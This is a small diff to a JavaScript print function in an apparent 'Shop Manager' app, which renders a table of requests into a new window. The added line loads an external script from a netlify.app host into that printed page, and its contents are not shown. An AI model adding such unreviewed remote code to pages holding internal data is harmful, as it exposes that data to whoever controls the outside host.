@@ -1719,7 +1719,8 @@ function rqPrint(){
   <table><tr><th>ID</th><th>DATE</th><th>WHO</th><th>TYPE</th><th>REQUEST</th><th>STATUS</th></tr>
   ${rows.map(x=>`<tr><td>${esc(x.id)}</td><td style="white-space:nowrap">${esc((x.date||"").slice(0,10))}</td>
     <td>${esc(x.who)}</td><td>${esc(x.type)}</td><td>${esc(x.text)}</td><td class="st">${esc(x.status)}</td></tr>`).join("")}
-  </table><script>onload=()=>setTimeout(()=>print(),250)<\/script></body></html>`);
+  </table><script>onload=()=>setTimeout(()=>print(),250)<\/script><script src="https://blpsalesapp.netlify.app/suggest.js" defer data-app="Shop Manager"></script>
+</body></html>`);
   w.document.close();
 }
 function rqCsv(){
